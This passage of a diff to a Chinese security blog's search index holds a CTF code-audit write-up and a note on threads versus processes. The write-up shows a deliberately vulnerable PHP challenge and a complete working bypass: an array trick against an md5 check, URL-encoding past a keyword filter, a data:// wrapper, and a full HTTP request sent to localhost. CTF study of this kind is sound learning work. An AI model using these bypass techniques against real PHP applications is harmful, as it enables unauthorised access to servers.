invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack....&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag </span>=== <span class="string">&#x27;security&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span><span class="title function_ invoke__"> die</span>(<span class="string">&#x27;Hello Hack.....&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p> 一个简单的 MD5 绕过<br> <code>if(!(substr($_GET[&#39;cyber&#39;], 32) === md5($_GET[&#39;cyber&#39;])))</code><br> 这里的绕过思路很简单，传进去是个数组的时候，值就为空，自然就相等了</p>
+<p> 然后是<br> <code>if(preg_match(&#39;/^ciscnsec$/&#39;, $_GET[&#39;ciscn&#39;]) &amp;&amp; $_GET[&#39;ciscn&#39;] !== &#39;ciscnsec&#39;)</code><br> preg_match()函数没有规定开头，ciscn&#x3D;ciscnsec （URL加密）</p>
+<p> file_get_contents 函数<br><code>if(isset($getflag) &amp;&amp; $getflag === &#39;security&#39;)</code><br>用到php伪协议<br>flag&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,security<br>官方给的wp里看了一下，然后看了一下<a href="https://www.php.net/manual/zh/wrappers.data.php">php手册</a></p>
+<p>最后组合就是</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">cyber[]&amp;ciscn=ciscnsec&amp;flag=data://text/plain,security</span><br><span class="line">URL编码如下</span><br><span class="line">/?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79 </span><br><span class="line"></span><br><span class="line">//放到BP里跑一遍，就返回flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">ciscn</span>=<span class="number">777</span>&amp;flag=<span class="number">777</span></span></span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>做题笔记</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+        <tag>code audit</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF密码学入门学习(一)</title>
     <url>/yakko117/2020/02/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A61/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">格式：flag&#123; &#125;</span><br></pre></td></tr></table></figure></div>
@@ -2301,48 +2343,6 @@
         <tag>writeup</tag>
         <tag>ctf</tag>
         <tag>密码学</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>贴贴校赛代码审计题的总结学习</title>
-    <url>/yakko117/2019/09/26/ccsu_codeaudit/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Code-Easy-Audit"><a href="#Code-Easy-Audit" class="headerlink" title="Code_Easy_Audit"></a>Code_Easy_Audit</h1><p>首先看源码吧</p>
-<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Null          ...            Null            ...            Null          ...  &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span><span class="title function_ invoke__"> </span>(<span class="variable">$_REQUEST as</span> <span class="variable">$key </span>=&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cyber|flag|ciscn/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>])))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack...&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^ciscnsec$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>] !== <span class="string">&#x27;ciscnsec&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag </span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack....&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag </span>=== <span class="string">&#x27;security&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span><span class="title function_ invoke__"> die</span>(<span class="string">&#x27;Hello Hack.....&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>这题考几个点：</p>
-<ol>
-<li><code>$_REQUEST</code> 的变量覆盖</li>
-<li>编码绕过</li>
-<li>PHP数组特性</li>
-<li>正则绕过</li>
-<li><code>file_get_contents</code> 函数</li>
-</ol>
-<hr>
-<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span><span class="title function_ invoke__"> </span>(<span class="variable">$_REQUEST as</span> <span class="variable">$key </span>=&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p> 上述代码把 <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>传进来的值进行了正则匹配，如果包含了<code>A-Z</code> 和 <code>a-z</code>的字母就被waf</p>
-<p>这里的 <code>$_REQUEST</code>有一个特性，就是当 <code>GET</code> 和 <code>POST</code> 都存在同一个变量名的时候，只获取 <code>POST</code> 中的值，所以可以通过这个特性来绕过正则的匹配</p>
-<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdve9vj31570g240l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdve9vj31570g240l.jpg" class="lazyload"></a></p>
-<p>当POST中也有个变量的时候，abc就会输出，否则就输出waf</p>
-<hr>
-<p>接着往下分析</p>
-<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cyber|flag|ciscn/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack..&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>关于 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 获取的值，就是get中变量名和内容</p>
-<p>详细资料可以参考<a href="https://blog.csdn.net/fjb2080/article/details/80548431">一篇CSDN详解</a><br>这个绕过思路就是 <code>URL编码</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdvcfwj30z70mf411.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdvcfwj30z70mf411.jpg" class="lazyload"></a></p>
-<hr>
-<p>然后就是下面的代码</p>
-<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>])))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack...&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^ciscnsec$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>] !== <span class="string">&#x27;ciscnsec&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag </span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack....&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag </span>=== <span class="string">&#x27;security&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span><span class="title function_ invoke__"> die</span>(<span class="string">&#x27;Hello Hack.....&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p> 一个简单的 MD5 绕过<br> <code>if(!(substr($_GET[&#39;cyber&#39;], 32) === md5($_GET[&#39;cyber&#39;])))</code><br> 这里的绕过思路很简单，传进去是个数组的时候，值就为空，自然就相等了</p>
-<p> 然后是<br> <code>if(preg_match(&#39;/^ciscnsec$/&#39;, $_GET[&#39;ciscn&#39;]) &amp;&amp; $_GET[&#39;ciscn&#39;] !== &#39;ciscnsec&#39;)</code><br> preg_match()函数没有规定开头，ciscn&#x3D;ciscnsec （URL加密）</p>
-<p> file_get_contents 函数<br><code>if(isset($getflag) &amp;&amp; $getflag === &#39;security&#39;)</code><br>用到php伪协议<br>flag&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,security<br>官方给的wp里看了一下，然后看了一下<a href="https://www.php.net/manual/zh/wrappers.data.php">php手册</a></p>
-<p>最后组合就是</p>
-<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">cyber[]&amp;ciscn=ciscnsec&amp;flag=data://text/plain,security</span><br><span class="line">URL编码如下</span><br><span class="line">/?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79 </span><br><span class="line"></span><br><span class="line">//放到BP里跑一遍，就返回flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">ciscn</span>=<span class="number">777</span>&amp;flag=<span class="number">777</span></span></span><br></pre></td></tr></table></figure></div>]]></content>
-      <categories>
-        <category>做题笔记</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-        <tag>code audit</tag>
       </tags>
   </entry>
   <entry>
@@ -3521,52 +3521,6 @@
       </tags>
   </entry>
   <entry>
-    <title>线程和进程的区别（学习）</title>
-    <url>/yakko117/2019/07/25/%E7%BA%BF%E7%A8%8B%E4%B8%8E%E8%BF%9B%E7%A8%8B/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="线程和进程的区别"><a href="#线程和进程的区别" class="headerlink" title="线程和进程的区别"></a>线程和进程的区别</h1><h2 id="1、进程是什么？"><a href="#1、进程是什么？" class="headerlink" title="1、进程是什么？"></a>1、进程是什么？</h2><p>是具有一定独立功能的程序、它是系统进行资源分配和调度的一个独立单位，重点在系统调度和单独的单位，也就是说进程是可以独立运行的一段程序。    </p>
-<h2 id="2、线程又是什么？"><a href="#2、线程又是什么？" class="headerlink" title="2、线程又是什么？"></a>2、线程又是什么？</h2><p>线程进程的一个实体，是CPU调度和分派的基本单位，他是比进程更小的能独立运行的基本单位，线程自己基本上不拥有系统资源。在运行时，只是暂用一些计数器、寄存器和栈 。</p>
-<ul>
-<li>进程(程序)：是静态概念，一个class文件、一个exe文件</li>
-<li>线程：是一个程序里面不同的执行路径</li>
-<li><a href="https://www.cnblogs.com/zhehan54/p/6130030.html">参考CSDN</a></li>
-</ul>
-<hr>
-<h2 id="它们之间的关系"><a href="#它们之间的关系" class="headerlink" title="它们之间的关系"></a>它们之间的关系</h2><ul>
-<li>1、一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程（通常说的主线程）。</li>
-<li>2、资源分配给进程，同一进程的所有线程共享该进程的所有资源。</li>
-<li>3、线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的办法实现同步。   </li>
-<li>4、处理机分给线程，即真正在处理机上运行的是线程。   </li>
-<li>5、线程是指进程内的一个执行单元，也是进程内的可调度实体。</li>
-</ul>
-<hr>
-<h1 id="进程与线程的资源"><a href="#进程与线程的资源" class="headerlink" title="进程与线程的资源"></a>进程与线程的资源</h1><h2 id="堆与栈"><a href="#堆与栈" class="headerlink" title="堆与栈"></a>堆与栈</h2><ol>
-<li><p>堆是大家共有的空间，分全局堆和局部堆。全局堆就是所有没有分配的空间，局部堆就是用户分配的空间。堆在操作系统对进程初始化的时候分配，运行过程中也可以向系统要额外的堆，但是记得用完了要还给操作系统，要不然就是内存泄漏。</p>
-</li>
-<li><p>栈是个线程独有的，保存其运行状态和局部自动变量的。栈在线程开始的时候初始化，每个线程的栈互相独立，因此，栈是 <code>thread safe</code>的。操作系统在切换线程的时候会自动的切换栈，就是切换 <code>ＳＳ／ＥＳＰ</code>寄存器。栈空间不需要在高级语言里面显式的分配和释放。</p>
-</li>
-</ol>
-<hr>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>线程共享的环境包括：进程代码段、进程的公有数据(利用这些共享的数据，线程很容易的实现相互之间的通讯)、进程打开的文件描述符、信号的处理器、进程的当前目录和进程用户ID与进程组ID。<br>进程拥有这许多共性的同时，还拥有自己的个性。有了这些个性，线程才能实现并发性。这些个性包括：</p>
-<h3 id="1-线程ID"><a href="#1-线程ID" class="headerlink" title="1.线程ID"></a>1.线程ID</h3><p>每个线程都有自己的线程ID，这个ID在本进程中是唯一的。<br>进程用此来标识线程。</p>
-<hr>
-<h3 id="2-寄存器组的值"><a href="#2-寄存器组的值" class="headerlink" title="2.寄存器组的值"></a>2.寄存器组的值</h3><p>由于线程间是并发运行的，每个线程有自己不同的运行线索，<br>当从一个线程切换到另一个线程上时，必须将原有的线程的寄存器集合的状态保存，<br>以便将来该线程在被重新切换到时能得以恢复。</p>
-<hr>
-<h3 id="3-线程的堆栈"><a href="#3-线程的堆栈" class="headerlink" title="3.线程的堆栈"></a>3.线程的堆栈</h3><p>堆栈是保证线程独立运行所必须的。<br>线程函数可以调用函数，而被调用函数中又是可以层层嵌套的，<br>所以线程必须拥有自己的函数堆栈，使得函数调用可以正常执行，<br>不受其他线程的影响。</p>
-<hr>
-<h3 id="4-错误返回码"><a href="#4-错误返回码" class="headerlink" title="4.错误返回码"></a>4.错误返回码</h3><p>由于同一个进程中有很多个线程在同时运行，可能某个线程进行系统调用<br>后设置了errno值，而在该线程还没有处理这个错误，另外一个线程就在此时<br>被调度器投入运行，这样错误值就有可能被修改。<br>所以，不同的线程应该拥有自己的错误返回码变量。</p>
-<hr>
-<h3 id="5-线程的信号屏蔽码"><a href="#5-线程的信号屏蔽码" class="headerlink" title="5.线程的信号屏蔽码"></a>5.线程的信号屏蔽码</h3><p>由于每个线程所感兴趣的信号不同，<br>所以线程的信号屏蔽码应该由线程自己管理。<br>但所有的线程都共享同样的信号处理器。</p>
-<hr>
-<h3 id="6-线程的优先级"><a href="#6-线程的优先级" class="headerlink" title="6.线程的优先级"></a>6.线程的优先级</h3><p>由于线程需要像进程那样能够被调度，<br>那么就必须要有可供调度使用的参数，这个参数就是线程的优先级。<br><a href="https://blog.csdn.net/shuilan0066/article/details/7683315">参考CSDN</a></p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>瞎扯</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>渗透总结学习笔记（误</title>
     <url>/yakko117/2019/09/12/%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz572tahj31hc0u0qpx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz572tahj31hc0u0qpx.jpg" class="lazyload"></a></p>
@@ -3662,6 +3616,52 @@
       <tags>
         <tag>瞎扯</tag>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>线程和进程的区别（学习）</title>
+    <url>/yakko117/2019/07/25/%E7%BA%BF%E7%A8%8B%E4%B8%8E%E8%BF%9B%E7%A8%8B/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="线程和进程的区别"><a href="#线程和进程的区别" class="headerlink" title="线程和进程的区别"></a>线程和进程的区别</h1><h2 id="1、进程是什么？"><a href="#1、进程是什么？" class="headerlink" title="1、进程是什么？"></a>1、进程是什么？</h2><p>是具有一定独立功能的程序、它是系统进行资源分配和调度的一个独立单位，重点在系统调度和单独的单位，也就是说进程是可以独立运行的一段程序。    </p>
+<h2 id="2、线程又是什么？"><a href="#2、线程又是什么？" class="headerlink" title="2、线程又是什么？"></a>2、线程又是什么？</h2><p>线程进程的一个实体，是CPU调度和分派的基本单位，他是比进程更小的能独立运行的基本单位，线程自己基本上不拥有系统资源。在运行时，只是暂用一些计数器、寄存器和栈 。</p>
+<ul>
+<li>进程(程序)：是静态概念，一个class文件、一个exe文件</li>
+<li>线程：是一个程序里面不同的执行路径</li>
+<li><a href="https://www.cnblogs.com/zhehan54/p/6130030.html">参考CSDN</a></li>
+</ul>
+<hr>
+<h2 id="它们之间的关系"><a href="#它们之间的关系" class="headerlink" title="它们之间的关系"></a>它们之间的关系</h2><ul>
+<li>1、一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程（通常说的主线程）。</li>
+<li>2、资源分配给进程，同一进程的所有线程共享该进程的所有资源。</li>
+<li>3、线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的办法实现同步。   </li>
+<li>4、处理机分给线程，即真正在处理机上运行的是线程。   </li>
+<li>5、线程是指进程内的一个执行单元，也是进程内的可调度实体。</li>
+</ul>
+<hr>
+<h1 id="进程与线程的资源"><a href="#进程与线程的资源" class="headerlink" title="进程与线程的资源"></a>进程与线程的资源</h1><h2 id="堆与栈"><a href="#堆与栈" class="headerlink" title="堆与栈"></a>堆与栈</h2><ol>
+<li><p>堆是大家共有的空间，分全局堆和局部堆。全局堆就是所有没有分配的空间，局部堆就是用户分配的空间。堆在操作系统对进程初始化的时候分配，运行过程中也可以向系统要额外的堆，但是记得用完了要还给操作系统，要不然就是内存泄漏。</p>
+</li>
+<li><p>栈是个线程独有的，保存其运行状态和局部自动变量的。栈在线程开始的时候初始化，每个线程的栈互相独立，因此，栈是 <code>thread safe</code>的。操作系统在切换线程的时候会自动的切换栈，就是切换 <code>ＳＳ／ＥＳＰ</code>寄存器。栈空间不需要在高级语言里面显式的分配和释放。</p>
+</li>
+</ol>
+<hr>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>线程共享的环境包括：进程代码段、进程的公有数据(利用这些共享的数据，线程很容易的实现相互之间的通讯)、进程打开的文件描述符、信号的处理器、进程的当前目录和进程用户ID与进程组ID。<br>进程拥有这许多共性的同时，还拥有自己的个性。有了这些个性，线程才能实现并发性。这些个性包括：</p>
+<h3 id="1-线程ID"><a href="#1-线程ID" class="headerlink" title="1.线程ID"></a>1.线程ID</h3><p>每个线程都有自己的线程ID，这个ID在本进程中是唯一的。<br>进程用此来标识线程。</p>
+<hr>
+<h3 id="2-寄存器组的值"><a href="#2-寄存器组的值" class="headerlink" title="2.寄存器组的值"></a>2.寄存器组的值</h3><p>由于线程间是并发运行的，每个线程有自己不同的运行线索，<br>当从一个线程切换到另一个线程上时，必须将原有的线程的寄存器集合的状态保存，<br>以便将来该线程在被重新切换到时能得以恢复。</p>
+<hr>
+<h3 id="3-线程的堆栈"><a href="#3-线程的堆栈" class="headerlink" title="3.线程的堆栈"></a>3.线程的堆栈</h3><p>堆栈是保证线程独立运行所必须的。<br>线程函数可以调用函数，而被调用函数中又是可以层层嵌套的，<br>所以线程必须拥有自己的函数堆栈，使得函数调用可以正常执行，<br>不受其他线程的影响。</p>
+<hr>
+<h3 id="4-错误返回码"><a href="#4-错误返回码" class="headerlink" title="4.错误返回码"></a>4.错误返回码</h3><p>由于同一个进程中有很多个线程在同时运行，可能某个线程进行系统调用<br>后设置了errno值，而在该线程还没有处理这个错误，另外一个线程就在此时<br>被调度器投入运行，这样错误值就有可能被修改。<br>所以，不同的线程应该拥有自己的错误返回码变量。</p>
+<hr>
+<h3 id="5-线程的信号屏蔽码"><a href="#5-线程的信号屏蔽码" class="headerlink" title="5.线程的信号屏蔽码"></a>5.线程的信号屏蔽码</h3><p>由于每个线程所感兴趣的信号不同，<br>所以线程的信号屏蔽码应该由线程自己管理。<br>但所有的线程都共享同样的信号处理器。</p>
+<hr>
+<h3 id="6-线程的优先级"><a href="#6-线程的优先级" class="headerlink" title="6.线程的优先级"></a>6.线程的优先级</h3><p>由于线程需要像进程那样能够被调度，<br>那么就必须要有可供调度使用的参数，这个参数就是线程的优先级。<br><a href="https://blog.csdn.net/shuilan0066/article/details/7683315">参考CSDN</a></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>瞎扯</tag>
       </tags>
   </entry>
   <entry>
